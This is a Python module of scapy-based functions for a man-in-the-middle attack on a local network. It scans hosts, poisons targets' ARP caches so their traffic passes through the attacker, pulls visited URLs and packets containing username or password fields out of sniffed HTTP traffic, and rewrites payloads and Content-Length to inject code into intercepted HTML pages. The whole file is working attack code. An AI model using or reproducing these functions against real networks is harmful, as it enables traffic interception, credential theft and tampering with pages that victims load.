from scapy.all import *
from scapy.layers import http

def scan(IP):
	ans_list = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=1, verbose=False)[0]
	clients_list = []
	for QueryAnswer in ans_list:
		client_dict = {'IP' : QueryAnswer[1].psrc, 'MAC' : QueryAnswer[1].hwsrc}
		clients_list.append(client_dict)
	return clients_list

def get_mac(IP):
	# sr() or srp() returns answered and unanswered lists
	ans_list = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=1, verbose=False)[0]
	if len(ans_list) > 0:
		return ans_list[0][1].hwsrc
	else:
		print(f"Waiting for MAC of {IP} ...")
		time.sleep(1)
		get_mac(IP)

def get_ip(network, MAC):
	clients_list = scan(network)
	for client in clients_list:
		if MAC == client['MAC']:
			return client['IP']

def spoof(target_ip, spoofed_ip):
	target_mac = get_mac(target_ip)
	pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
	send(pkt, verbose=False)

def restore(target_ip, spoofed_ip):
	target_mac = get_mac(target_ip)
	spoofed_mac = get_mac(spoofed_ip)
	pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc=spoofed_mac)
	send(pkt, count=4, verbose=False)

def get_url(pkt):
	if pkt.haslayer(http.HTTPRequest):
		return pkt[http.HTTPRequest].Host + pkt[http.HTTPRequest].Path

def get_login_info(pkt):
	if pkt.haslayer(Raw):
		load = pkt['Raw'].load
		keywords = ['username', 'user', 'login', 'password', 'pass']
		for keyword in keywords:
			if keyword.encode() in load:
				return load

def set_load(pkt, load):
	pkt[Raw].load = load
	del pkt[IP].len
	del pkt[IP].chksum
	del pkt[TCP].chksum
	return pkt

def modify_content_length(load):
	content_length_search = re.search(r"(?:Content-Length:\s)(\d*)", load)
	if content_length_search and "text/html" in load:
		content_length = content_length_search.group(1)
		new_content_length = int(content_length) + len(code_inject)
		load = load.replace(content_length, str(new_content_length))
	return load